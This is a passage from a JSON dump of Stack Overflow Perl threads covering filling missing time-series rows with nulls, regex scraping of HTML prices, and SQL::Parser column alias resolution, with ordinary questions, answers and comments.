2016-02-06,20:00:00,ujjawal,36072-2,MT,14,0,1\n2016-02-06,20:10:00,ujjawal,36072-2,MT,12,0,4\n2016-02-06,20:20:00,ujjawal,36072-2,MT,11,0,2\n2016-02-06,20:30:00,ujjawal,36072-2,MT,12,0,1\n2016-02-06,20:40:00,ujjawal,36072-2,MT,6,0,1\n2016-02-06,20:50:00,ujjawal,36072-2,MT,13,0,2\n2016-02-06,21:00:00,ujjawal,36072-2,MT,5,0,1\n2016-02-06,21:10:00,ujjawal,36072-2,MT,12,0,2\n2016-02-06,21:20:00,ujjawal,36072-2,MT,1,0,1\n2016-02-06,21:30:00,ujjawal,36072-2,MT,21,0,2\n2016-02-06,21:40:00,null,null,null,null,null,null\n2016-02-06,21:50:00,ujjawal,36072-2,MT,9,0,3\n2016-02-06,22:00:00,ujjawal,36072-2,MT,2,0,1\n2016-02-06,22:10:00,ujjawal,36072-2,MT,12,0,5\n2016-02-06,22:20:00,ujjawal,36072-2,MT,1,0,1\n2016-02-06,22:30:00,ujjawal,36072-2,MT,9,0,1\n2016-02-06,22:40:00,ujjawal,36072-2,MT,13,0,1\n2016-02-06,22:50:00,null,null,null,null,null,null\n2016-02-06,23:00:00,ujjawal,36072-2,MT,20,0,2\n2016-02-06,23:10:00,ujjawal,36072-2,MT,10,0,3\n2016-02-06,23:20:00,ujjawal,36072-2,MT,10,0,1\n2016-02-06,23:30:00,ujjawal,36072-2,MT,6,0,1\n2016-02-06,23:40:00,ujjawal,36072-2,MT,12,0,1\n2016-02-06,23:50:00,null,null,null,null,null,null\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 0, "last_activity_date": 1467889841, "last_edit_date": 1467889841, "creation_date": 1457448389, "answer_id": 35870446, "question_id": 35860915, "link": "https://stackoverflow.com/questions/35860915/insert-null-values-in-missing-rows-of-file/35870446#35870446", "title": "insert null values in missing rows of file", "body": "<p>Here's another Perl solution</p>\n\n<p>It initialises <code>$date</code> to the date contained in the first line of the file, and a time of <code>00:00:00</code></p>\n\n<p>It then fills the <code>%values</code> hash with records using the value of <code>$date</code> as a key, incrementing the value by ten minutes until the day of month changes. These form the \"default\" values</p>\n\n<p>Then the contents of the file are used to overwrite all elements of <code>%values</code> for which we have an actual value. Any gaps will remain set to their default from the previous step</p>\n\n<p>Then the hash is simply printed in sorted order, resulting in a full set of data with defaults inserted as necessary</p>\n\n<pre><code>use strict;\nuse warnings 'all';\n\nuse Time::Piece;\nuse Time::Seconds 'ONE_MINUTE';\nuse Fcntl ':seek';\n\nmy $delta = 10 * ONE_MINUTE;\n\nmy $date = Time::Piece-&gt;strptime(&lt;ARGV&gt; =~ /^([\\d-]+)/, '%Y-%m-%d');\n\nmy %values;\n\nfor ( my $day = $date-&gt;mday; $date-&gt;mday == $day; $date += $delta ) {\n    my $ds = $date-&gt;strftime('%Y-%m-%d,%H:%M:%S');\n    $values{$ds} = $ds. ',null' x 6 . \"\\n\";\n}\n\nseek ARGV, 0, SEEK_SET;\nwhile ( &lt;ARGV&gt; ) {\n    my ($ds) = /^([\\d-]+,[\\d:]+)/;\n    $values{$ds} = $_;\n}\n\nprint $values{$_} for sort keys %values;\n</code></pre>\n"}], "owner": {"reputation": 35, "user_id": 5312268, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/35a0d53a7be1f12fc011e45c76f0148e?s=128&d=identicon&r=PG&f=1", "display_name": "Priyanka Tiwari", "link": "https://stackoverflow.com/users/5312268/priyanka-tiwari"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 63, "favorite_count": 0, "accepted_answer_id": 35870446, "answer_count": 5, "score": 0, "last_activity_date": 1467889860, "creation_date": 1457420147, "last_edit_date": 1457433258, "question_id": 35860915, "link": "https://stackoverflow.com/questions/35860915/insert-null-values-in-missing-rows-of-file", "title": "insert null values in missing rows of file", "body": "<p>I have a text file which consists some data of 24 hours time stamp segregated in 10 minutes interval.</p>\n\n<pre><code>2016-02-06,00:00:00,ujjawal,36072-2,MT,37,0,1  \n2016-02-06,00:10:00,ujjawal,36072-2,MT,37,0,1  \n2016-02-06,00:20:00,ujjawal,36072-2,MT,37,0,1  \n2016-02-06,00:40:00,ujjawal,36072-2,MT,37,0,1  \n2016-02-06,00:50:00,ujjawal,36072-2,MT,42,0,2  \n2016-02-06,01:00:00,ujjawal,36072-2,MT,55,0,2  \n2016-02-06,01:10:00,ujjawal,36072-2,MT,41,0,2  \n2016-02-06,01:20:00,ujjawal,36072-2,MT,46,0,2  \n2016-02-06,01:30:00,ujjawal,36072-2,MT,56,0,3  \n2016-02-06,01:40:00,ujjawal,36072-2,MT,38,0,2  \n2016-02-06,01:50:00,ujjawal,36072-2,MT,49,0,2  \n2016-02-06,02:00:00,ujjawal,36072-2,MT,58,0,4  \n2016-02-06,02:10:00,ujjawal,36072-2,MT,43,0,2  \n2016-02-06,02:20:00,ujjawal,36072-2,MT,46,0,2  \n2016-02-06,02:30:00,ujjawal,36072-2,MT,61,0,2  \n2016-02-06,02:40:00,ujjawal,36072-2,MT,57,0,3  \n2016-02-06,02:50:00,ujjawal,36072-2,MT,45,0,2  \n2016-02-06,03:00:00,ujjawal,36072-2,MT,45,0,3  \n2016-02-06,03:10:00,ujjawal,36072-2,MT,51,0,2  \n2016-02-06,03:20:00,ujjawal,36072-2,MT,68,0,3  \n2016-02-06,03:30:00,ujjawal,36072-2,MT,51,0,2  \n2016-02-06,03:40:00,ujjawal,36072-2,MT,68,0,3  \n2016-02-06,03:50:00,ujjawal,36072-2,MT,67,0,3  \n2016-02-06,04:00:00,ujjawal,36072-2,MT,82,0,8  \n2016-02-06,04:10:00,ujjawal,36072-2,MT,82,0,5  \n2016-02-06,04:20:00,ujjawal,36072-2,MT,122,0,4   \n2016-02-06,04:30:00,ujjawal,36072-2,MT,133,0,3  \n2016-02-06,04:40:00,ujjawal,36072-2,MT,142,0,3  \n2016-02-06,04:50:00,ujjawal,36072-2,MT,202,0,1  \n2016-02-06,05:00:00,ujjawal,36072-2,MT,731,1,3  \n2016-02-06,05:10:00,ujjawal,36072-2,MT,372,0,7  \n2016-02-06,05:20:00,ujjawal,36072-2,MT,303,0,2  \n2016-02-06,05:30:00,ujjawal,36072-2,MT,389,0,3  \n2016-02-06,05:40:00,ujjawal,36072-2,MT,454,0,1  \n2016-02-06,05:50:00,ujjawal,36072-2,MT,406,0,6  \n2016-02-06,06:00:00,ujjawal,36072-2,MT,377,0,1  \n2016-02-06,06:10:00,ujjawal,36072-2,MT,343,0,5  \n2016-02-06,06:20:00,ujjawal,36072-2,MT,370,0,2  \n2016-02-06,06:30:00,ujjawal,36072-2,MT,343,0,9  \n2016-02-06,06:40:00,ujjawal,36072-2,MT,315,0,8  \n2016-02-06,06:50:00,ujjawal,36072-2,MT,458,0,3  \n2016-02-06,07:00:00,ujjawal,36072-2,MT,756,1,3  \n2016-02-06,07:10:00,ujjawal,36072-2,MT,913,1,3  \n2016-02-06,07:20:00,ujjawal,36072-2,MT,522,0,3  \n2016-02-06,07:30:00,ujjawal,36072-2,MT,350,0,7  \n2016-02-06,07:40:00,ujjawal,36072-2,MT,328,0,6  \n2016-02-06,07:50:00,ujjawal,36072-2,MT,775,1,3  \n2016-02-06,08:00:00,ujjawal,36072-2,MT,310,0,9  \n2016-02-06,08:10:00,ujjawal,36072-2,MT,308,0,6  \n2016-02-06,08:20:00,ujjawal,36072-2,MT,738,1,3  \n2016-02-06,08:30:00,ujjawal,36072-2,MT,294,0,6  \n2016-02-06,08:40:00,ujjawal,36072-2,MT,345,0,1  \n2016-02-06,08:50:00,ujjawal,36072-2,MT,367,0,6  \n2016-02-06,09:00:00,ujjawal,36072-2,MT,480,0,3  \n2016-02-06,09:10:00,ujjawal,36072-2,MT,390,0,3  \n2016-02-06,09:20:00,ujjawal,36072-2,MT,436,0,3  \n2016-02-06,09:30:00,ujjawal,36072-2,MT,1404,2,3  \n2016-02-06,09:40:00,ujjawal,36072-2,MT,346,0,3  \n2016-02-06,09:50:00,ujjawal,36072-2,MT,388,0,3  \n2016-02-06,10:00:00,ujjawal,36072-2,MT,456,0,2  \n2016-02-06,10:10:00,ujjawal,36072-2,MT,273,0,7  \n2016-02-06,10:20:00,ujjawal,36072-2,MT,310,0,3  \n2016-02-06,10:30:00,ujjawal,36072-2,MT,256,0,7  \n2016-02-06,10:40:00,ujjawal,36072-2,MT,283,0,3  \n2016-02-06,10:50:00,ujjawal,36072-2,MT,276,0,3  \n2016-02-06,11:00:00,ujjawal,36072-2,MT,305,0,1  \n2016-02-06,11:10:00,ujjawal,36072-2,MT,310,0,9  \n2016-02-06,11:20:00,ujjawal,36072-2,MT,286,0,3  \n2016-02-06,11:30:00,ujjawal,36072-2,MT,286,0,3  \n2016-02-06,11:40:00,ujjawal,36072-2,MT,247,0,7  \n2016-02-06,11:50:00,ujjawal,36072-2,MT,366,0,2  \n2016-02-06,12:00:00,ujjawal,36072-2,MT,294,0,2  \n2016-02-06,12:10:00,ujjawal,36072-2,MT,216,0,5  \n2016-02-06,12:20:00,ujjawal,36072-2,MT,233,0,1  \n2016-02-06,12:30:00,ujjawal,36072-2,MT,785,1,2  \n2016-02-06,12:40:00,ujjawal,36072-2,MT,466,0,1  \n2016-02-06,12:50:00,ujjawal,36072-2,MT,219,0,9  \n2016-02-06,13:00:00,ujjawal,36072-2,MT,248,0,6  \n2016-02-06,13:10:00,ujjawal,36072-2,MT,223,0,7  \n2016-02-06,13:20:00,ujjawal,36072-2,MT,276,0,8  \n2016-02-06,13:30:00,ujjawal,36072-2,MT,219,0,6  \n2016-02-06,13:40:00,ujjawal,36072-2,MT,699,1,2  \n2016-02-06,13:50:00,ujjawal,36072-2,MT,439,0,2  \n2016-02-06,14:00:00,ujjawal,36072-2,MT,1752,2,3  \n2016-02-06,14:10:00,ujjawal,36072-2,MT,203,0,5  \n2016-02-06,14:20:00,ujjawal,36072-2,MT,230,0,7  \n2016-02-06,14:30:00,ujjawal,36072-2,MT,226,0,1  \n2016-02-06,14:40:00,ujjawal,36072-2,MT,195,0,6  \n2016-02-06,14:50:00,ujjawal,36072-2,MT,314,0,1  \n2016-02-06,15:00:00,ujjawal,36072-2,MT,357,0,2  \n2016-02-06,15:10:00,ujjawal,36072-2,MT,387,0,9  \n2016-02-06,15:20:00,ujjawal,36072-2,MT,1084,1,3  \n2016-02-06,15:30:00,ujjawal,36072-2,MT,1295,2,3  \n2016-02-06,15:40:00,ujjawal,36072-2,MT,223,0,8  \n2016-02-06,15:50:00,ujjawal,36072-2,MT,254,0,1  \n2016-02-06,16:00:00,ujjawal,36072-2,MT,252,0,7  \n2016-02-06,16:10:00,ujjawal,36072-2,MT,268,0,1  \n2016-02-06,16:20:00,ujjawal,36072-2,MT,242,0,1  \n2016-02-06,16:30:00,ujjawal,36072-2,MT,254,0,9  \n2016-02-06,16:40:00,ujjawal,36072-2,MT,271,0,3  \n2016-02-06,16:50:00,ujjawal,36072-2,MT,244,0,7  \n2016-02-06,17:00:00,ujjawal,36072-2,MT,281,0,1  \n2016-02-06,17:10:00,ujjawal,36072-2,MT,190,0,8  \n2016-02-06,17:20:00,ujjawal,36072-2,MT,187,0,1  \n2016-02-06,17:30:00,ujjawal,36072-2,MT,173,0,9  \n2016-02-06,17:40:00,ujjawal,36072-2,MT,140,0,5  \n2016-02-06,17:50:00,ujjawal,36072-2,MT,147,0,6  \n2016-02-06,18:00:00,ujjawal,36072-2,MT,109,0,4  \n2016-02-06,18:10:00,ujjawal,36072-2,MT,99,0,1  \n2016-02-06,18:20:00,ujjawal,36072-2,MT,66,0,6  \n2016-02-06,18:30:00,ujjawal,36072-2,MT,67,0,4  \n2016-02-06,18:40:00,ujjawal,36072-2,MT,40,0,2  \n2016-02-06,18:50:00,ujjawal,36072-2,MT,52,0,3  \n2016-02-06,19:00:00,ujjawal,36072-2,MT,40,0,3  \n2016-02-06,19:10:00,ujjawal,36072-2,MT,30,0,2  \n2016-02-06,19:20:00,ujjawal,36072-2,MT,25,0,3  \n2016-02-06,19:30:00,ujjawal,36072-2,MT,35,0,4  \n2016-02-06,19:40:00,ujjawal,36072-2,MT,14,0,1  \n2016-02-06,19:50:00,ujjawal,36072-2,MT,97,0,7  \n2016-02-06,20:00:00,ujjawal,36072-2,MT,14,0,1  \n2016-02-06,20:10:00,ujjawal,36072-2,MT,12,0,4  \n2016-02-06,20:20:00,ujjawal,36072-2,MT,11,0,2  \n2016-02-06,20:30:00,ujjawal,36072-2,MT,12,0,1  \n2016-02-06,20:40:00,ujjawal,36072-2,MT,6,0,1   \n2016-02-06,20:50:00,ujjawal,36072-2,MT,13,0,2  \n2016-02-06,21:00:00,ujjawal,36072-2,MT,5,0,1   \n2016-02-06,21:10:00,ujjawal,36072-2,MT,12,0,2  \n2016-02-06,21:20:00,ujjawal,36072-2,MT,1,0,1   \n2016-02-06,21:30:00,ujjawal,36072-2,MT,21,0,2  \n2016-02-06,21:50:00,ujjawal,36072-2,MT,9,0,3   \n2016-02-06,22:00:00,ujjawal,36072-2,MT,2,0,1   \n2016-02-06,22:10:00,ujjawal,36072-2,MT,12,0,5  \n2016-02-06,22:20:00,ujjawal,36072-2,MT,1,0,1   \n2016-02-06,22:30:00,ujjawal,36072-2,MT,9,0,1   \n2016-02-06,22:40:00,ujjawal,36072-2,MT,13,0,1  \n2016-02-06,23:00:00,ujjawal,36072-2,MT,20,0,2  \n2016-02-06,23:10:00,ujjawal,36072-2,MT,10,0,3  \n2016-02-06,23:20:00,ujjawal,36072-2,MT,10,0,1  \n2016-02-06,23:30:00,ujjawal,36072-2,MT,6,0,1   \n2016-02-06,23:40:00,ujjawal,36072-2,MT,12,0,1  \n</code></pre>\n\n<p>if you see above sample as per 10 minutes interval there should be total 143 rows in 24 hours in this file but after second last line which has time <code>2016-02-06,23:40:00</code> data for date, time <code>2016-02-06,23:50:00</code> is missing.  </p>\n\n<p>similarly after <code>2016-02-06,22:40:00</code> data for date, time <code>2016-02-06,22:50:00</code> is missing.  </p>\n\n<p>can we insert missing date,time followed by 6 null separated by commas e.g.  <code>2016-02-06,22:50:00,null,null,null,null,null,null</code> where ever any data missing in rows of this file based on count no 143 rows and time stamp comparison in rows <code>2016-02-06,00:00:00</code> to <code>2016-02-06,23:50:00</code> which is also 143 in count ?  </p>\n\n<p>here is what i have tried<br>\ncreated a file with 143 entries of date and time as 2.csv and used below command  </p>\n\n<pre><code>join -j 2 -o 1.1,1.2,1.3,1.4,1.5,1.6,1.7,1.8,2.1,2.1,2.2 &lt;(sort -k2 1.csv) &lt;(sort -k2 2.csv)|grep \"2016-02-06,21:30:00\"| sort -u|sed \"s/\\t//g\"&gt; 3.txt\n</code></pre>\n\n<p>part of output is repetitive like this :  </p>\n\n<pre><code>        2016-02-06,21:30:00  \n 2016-02-06,21:30:00  \n\n2016-02-06,00:00:00,ujjawal,36072-2,MT,37,0,1  \n        2016-02-06,21:30:00  \n 2016-02-06,21:30:00  \n\n2016-02-06,00:10:00,ujjawal,36072-2,MT,37,0,1  \n        2016-02-06,21:30:00  \n 2016-02-06,21:30:00  \n\n2016-02-06,00:20:00,ujjawal,36072-2,MT,37,0,1  \n        2016-02-06,21:30:00  \n 2016-02-06,21:30:00  \n\n2016-02-06,00:40:00,ujjawal,36072-2,MT,37,0,1  \n        2016-02-06,21:30:00  \n 2016-02-06,21:30:00  \n\n2016-02-06,00:50:00,ujjawal,36072-2,MT,42,0,2  \n        2016-02-06,21:30:00  \n</code></pre>\n\n<p>any suggestions ?  </p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 2, "creation_date": 1457415495, "post_id": 35859610, "comment_id": 59384318, "body": "Ugh. Just... <a href=\"http://stackoverflow.com/a/1732454/82262\">don&#39;t</a>."}], "answers": [{"tags": [], "owner": {"reputation": 381798, "user_id": 1863229, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/4sh1l.png?s=128&g=1", "display_name": "Tim Biegeleisen", "link": "https://stackoverflow.com/users/1863229/tim-biegeleisen"}, "is_accepted": false, "score": 0, "last_activity_date": 1457415179, "creation_date": 1457415179, "answer_id": 35859742, "question_id": 35859610, "link": "https://stackoverflow.com/questions/35859610/regex-to-get-html-value-based-on-unique-class/35859742#35859742", "title": "Regex to get html value based on unique class", "body": "<p>You can iterate over the text for the website and apply the following code for each line:</p>\n\n<pre><code>$line = \"(much text) &lt;/div&gt; &lt;div class=\"euroPrice\"&gt; &lt;span&gt;1.23&lt;/span&gt;\";\nif ($line =~ /&lt;div class=\"euroPrice\"&gt; &lt;span&gt;(\\d+\\.\\d+)&lt;\\/span&gt;/) {\n    print \"first a number: $1 in current line\\n\";\n}\n</code></pre>\n\n<p>This solution assumes that there will be at most one match per line.</p>\n\n<p>You can explore the regular expression here:</p>\n\n<p><a href=\"https://regex101.com/r/mF4tO1/1\" rel=\"nofollow\"><strong>Regex101</strong></a></p>\n"}, {"comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1457433597, "post_id": 35860407, "comment_id": 59394162, "body": "Whilst I agree, I&#39;m not sure which modules I&#39;d be XPathify HTML. (My XML parsers tend to get upset by some of the HTMLisms)"}], "tags": [], "owner": {"reputation": 37822, "user_id": 1231450, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/b9c98b4ce12bf9fd925d8c35c8861bb2?s=128&d=identicon&r=PG", "display_name": "Jan", "link": "https://stackoverflow.com/users/1231450/jan"}, "is_accepted": true, "score": 1, "last_activity_date": 1457418076, "creation_date": 1457418076, "answer_id": 35860407, "question_id": 35859610, "link": "https://stackoverflow.com/questions/35859610/regex-to-get-html-value-based-on-unique-class/35860407#35860407", "title": "Regex to get html value based on unique class", "body": "<p>Better get your spans first (via an xpath) and get the span numbers with @Tims's regex. An xpath to get your spans would be:</p>\n\n<pre><code>(\"//div[@class='euroPrice']/span\")\n</code></pre>\n"}], "owner": {"reputation": 453, "user_id": 584355, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/KXF9J.jpg?s=128&g=1", "display_name": "Steffen Nieuwenhoven", "link": "https://stackoverflow.com/users/584355/steffen-nieuwenhoven"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 38, "favorite_count": 0, "accepted_answer_id": 35860407, "answer_count": 2, "score": -1, "last_activity_date": 1457418076, "creation_date": 1457414539, "question_id": 35859610, "link": "https://stackoverflow.com/questions/35859610/regex-to-get-html-value-based-on-unique-class", "title": "Regex to get html value based on unique class", "body": "<p>I'm using regex to parse a website in perl.\nThe content of the site look like this:</p>\n\n<pre><code>(much text) &lt;/div&gt; &lt;div class=\"euroPrice\"&gt; &lt;span&gt;1.23&lt;/span&gt; \n(much text) &lt;/div&gt; &lt;div class=\"euroPrice\"&gt; &lt;span&gt;2.34&lt;/span&gt; (much text)\n</code></pre>\n\n<p>with (much text) beeing standard html. I would like to get the numbers 1.23 and 2.34, but I have to use regex. \nAny hints?</p>\n\n<p>I tried something like this:</p>\n\n<pre><code>class=\"euroPrice\"&gt; &lt;span&gt;([\\d\\.]+)\n</code></pre>\n\n<p>But that only gave me the first one. </p>\n"}, {"tags": ["sql", "perl", "parsing"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1457426749, "post_id": 35858282, "comment_id": 59389602, "body": "Can you please add the expected output in a bit clearer way? The lower part of the question is a bit of babbling."}, {"owner": {"reputation": 434, "user_id": 5030105, "user_type": "registered", "accept_rate": 75, "profile_image": "https://graph.facebook.com/880590242014153/picture?type=large", "display_name": "Rafael Santos", "link": "https://stackoverflow.com/users/5030105/rafael-santos"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1457439641, "post_id": 35858282, "comment_id": 59398105, "body": "I&#39;ve edited the question, hope it is clearer how."}], "answers": [{"comments": [{"owner": {"reputation": 434, "user_id": 5030105, "user_type": "registered", "accept_rate": 75, "profile_image": "https://graph.facebook.com/880590242014153/picture?type=large", "display_name": "Rafael Santos", "link": "https://stackoverflow.com/users/5030105/rafael-santos"}, "edited": false, "score": 0, "creation_date": 1457551944, "post_id": 35891988, "comment_id": 59462276, "body": "Thanks -- works for the simple case I posted. I have to think about dealing with more complex WHERE clauses. I am not sure <code>eval_where</code> is helpful in this case, I only need to extract full column names, not eval whether it matches values or not (unless I misunderstood what <code>eval_where</code> does -- documentation and examples are sparse!)"}, {"owner": {"reputation": 6592, "user_id": 3005251, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5331f7e467aae3d581fe8bc814ef572?s=128&d=identicon&r=PG", "display_name": "bolav", "link": "https://stackoverflow.com/users/3005251/bolav"}, "reply_to_user": {"reputation": 434, "user_id": 5030105, "user_type": "registered", "accept_rate": 75, "profile_image": "https://graph.facebook.com/880590242014153/picture?type=large", "display_name": "Rafael Santos", "link": "https://stackoverflow.com/users/5030105/rafael-santos"}, "edited": false, "score": 0, "creation_date": 1457554512, "post_id": 35891988, "comment_id": 59463762, "body": "What I meant, is that since they have an eval function it is possible that they have a resolving deep in the source code somewhere. I didn&#39;t read that deep. Let me know if it doesn&#39;t work for your other cases."}, {"owner": {"reputation": 434, "user_id": 5030105, "user_type": "registered", "accept_rate": 75, "profile_image": "https://graph.facebook.com/880590242014153/picture?type=large", "display_name": "Rafael Santos", "link": "https://stackoverflow.com/users/5030105/rafael-santos"}, "edited": false, "score": 0, "creation_date": 1457620827, "post_id": 35891988, "comment_id": 59497283, "body": "Thanks for the hint -- I may need to get the source from that module and check anyway. I&#39;ve just discovered that the parser complains about &quot;select top 10 X,Y from...&quot; (error: <code>Bad table or column name: &#39;TOP 10&#39; has chars not alphanumeric or underscore</code>) -- I thought &quot;select top&quot; was standard SQL."}, {"owner": {"reputation": 6592, "user_id": 3005251, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5331f7e467aae3d581fe8bc814ef572?s=128&d=identicon&r=PG", "display_name": "bolav", "link": "https://stackoverflow.com/users/3005251/bolav"}, "reply_to_user": {"reputation": 434, "user_id": 5030105, "user_type": "registered", "accept_rate": 75, "profile_image": "https://graph.facebook.com/880590242014153/picture?type=large", "display_name": "Rafael Santos", "link": "https://stackoverflow.com/users/5030105/rafael-santos"}, "edited": false, "score": 0, "creation_date": 1457635823, "post_id": 35891988, "comment_id": 59507989, "body": "The answer to that is a bit long to do here, so it should be in a new question."}], "tags": [], "owner": {"reputation": 6592, "user_id": 3005251, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5331f7e467aae3d581fe8bc814ef572?s=128&d=identicon&r=PG", "display_name": "bolav", "link": "https://stackoverflow.com/users/3005251/bolav"}, "is_accepted": true, "score": 1, "last_activity_date": 1457527526, "creation_date": 1457527526, "answer_id": 35891988, "question_id": 35858282, "link": "https://stackoverflow.com/questions/35858282/perl-sqlparser-table-alias-substitution-works-for-select-column-names-but-not/35891988#35891988", "title": "Perl SQL::Parser table alias substitution: works for SELECT column names but not for WHERE column names", "body": "<p>Since SQL::Statement has an <code>eval_where</code>, I suspect there might be a better way, but you can try a function like this:</p>\n\n<pre><code>get_column($stmt-&gt;column_defs(), $where_hash-&gt;{arg1});\n\nsub get_column {\n    my ($columns, $arg) = @_;\n    return $arg-&gt;{fullorg} if ($arg-&gt;{type} ne 'column');\n    foreach my $col (@$columns) {\n        return $col-&gt;{value} if ($col-&gt;{fullorg} eq $arg-&gt;{fullorg});\n        my ($name) = ( $col-&gt;{fullorg} =~ /([^.]+)$/);\n        return $col-&gt;{value} if ($name eq $arg-&gt;{fullorg});\n    }\n    return $arg-&gt;{fullorg};\n}\n</code></pre>\n"}], "owner": {"reputation": 434, "user_id": 5030105, "user_type": "registered", "accept_rate": 75, "profile_image": "https://graph.facebook.com/880590242014153/picture?type=large", "display_name": "Rafael Santos", "link": "https://stackoverflow.com/users/5030105/rafael-santos"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 608, "favorite_count": 0, "accepted_answer_id": 35891988, "answer_count": 1, "score": 2, "last_activity_date": 1457527526, "creation_date": 1457407031, "last_edit_date": 1457439611, "question_id": 35858282, "link": "https://stackoverflow.com/questions/35858282/perl-sqlparser-table-alias-substitution-works-for-select-column-names-but-not", "title": "Perl SQL::Parser table alias substitution: works for SELECT column names but not for WHERE column names", "body": "<p>I'm trying to parse some SQL queries stored in a log database -- I don't want to submit them to a SQL database, just to extract the fields used in the SELECT and WHERE clause.</p>\n\n<p>I've been fiddling with several SQL parsers in Java, Python and Perl. The one that seems to work better for my problem are SQL::Parser and SQL::Statement. With those I was able to write the following code:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse SQL::Parser;\nuse SQL::Statement;\n\nuse Data::Dumper;\n\nmy $sql = \"SELECT sl.plate,sp.fehadop FROM sppLines AS sl \".\n          \"JOIN sppParams AS sp ON sl.specobjid = sp.specobjid \".\n          \"WHERE fehadop &lt; -3.5 \";\n\nmy $parser = SQL::Parser-&gt;new();\nmy $stmt = SQL::Statement-&gt;new($sql,$parser);\nprintf(\"COMMAND [%s]\\n\",$stmt-&gt;command);\nprintf(\"COLUMNS \\n\");\nmy @columns = @{$stmt-&gt;column_defs()};\nforeach my $column ( @columns) \n  {\n  print \"   \".$column-&gt;{value}.\"\\n\";\n  }\nprintf(\"TABLES \\n\");\nmy @tables = $stmt-&gt;tables();\nforeach my $table ( @tables) \n  {\n  print \"   \".$table-&gt;{name}.\"\\n\";\n  }\nprintf(\"WHERE COLUMNS\\n\");\nmy $where_hash = $stmt-&gt;where_hash();\nprint Dumper($where_hash);\n</code></pre>\n\n<p>Sorry if it is too long, it is the smallest, self-contained example I could devise.</p>\n\n<p>The output of this code is:</p>\n\n<pre><code>COMMAND [SELECT]\nCOLUMNS \n   spplines.plate\n   sppparams.fehadop\nTABLES \n   spplines\n   sppparams\nWHERE COLUMNS\n$VAR1 = {\n          'arg1' =&gt; {\n                      'value' =&gt; 'fehadop',\n                      'type' =&gt; 'column',\n                      'fullorg' =&gt; 'fehadop'\n                    },\n          'op' =&gt; '&lt;',\n          'nots' =&gt; {},\n          'arg2' =&gt; {\n                      'str' =&gt; '-?0?',\n                      'fullorg' =&gt; '-3.5',\n                      'name' =&gt; 'numeric_exp',\n                      'value' =&gt; [\n                                   {\n                                     'fullorg' =&gt; '3.5',\n                                     'value' =&gt; '3.5',\n                                     'type' =&gt; 'number'\n                                   }\n                                 ],\n                      'type' =&gt; 'function'\n                    },\n          'neg' =&gt; 0\n        };\n</code></pre>\n\n<p>The parser returns the name of columns (obtained through a call to <code>$stmt-&gt;column_defs()</code>) already renamed with the real tables names (e.g. <strong>spplines</strong>.plate instead of <strong>s1</strong>.plate) -- this is what I want.</p>\n\n<p>I also want the names of the columns used in the <code>WHERE</code> clause. \nI already know how to recursively parse the results of <code>$stmt-&gt;where_hash()</code> (didn't include the code to make the post clear), but even from dumping its contents I can see that the column names are not associated with the tables. </p>\n\n<p>I would like to ensure that the columns names in the <code>WHERE</code> clause are also preceded by the tables name. After parsing the results of <code>$stmt-&gt;where_hash()</code> I would get sppparams.fehadop instead of fehadop.</p>\n\n<p>Is this possible with SQL::Parser?</p>\n\n<p>Thanks\n(big edit -- tried to make the question clearer)</p>\n"}, {"tags": ["arrays", "perl", "sorting", "floating-point"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 3, "creation_date": 1457383668, "post_id": 35853361, "comment_id": 59373114, "body": "&quot;The bootstrapping procedure uses the same formula for generating the random number so it should be absolutely identical, but when comparing the same value, it becomes inaccurate.&quot; Can you provide a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> that demonstrates this?"}, {"owner": {"reputation": 85, "user_id": 3412393, "user_type": "registered", "accept_rate": 60, "profile_image": "https://graph.facebook.com/791837855/picture?type=large", "display_name": "user3412393", "link": "https://stackoverflow.com/users/3412393/user3412393"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1457384295, "post_id": 35853361, "comment_id": 59373470, "body": "Ok I will try to 